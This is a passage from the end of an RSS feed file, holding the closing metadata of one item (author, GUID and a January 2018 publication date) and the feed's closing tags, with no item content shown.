<author>perhaps</author>
<guid isPermaLink="false">2018-01-23-33203374</guid>
<pubDate>Tue, 23 Jan 2018 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
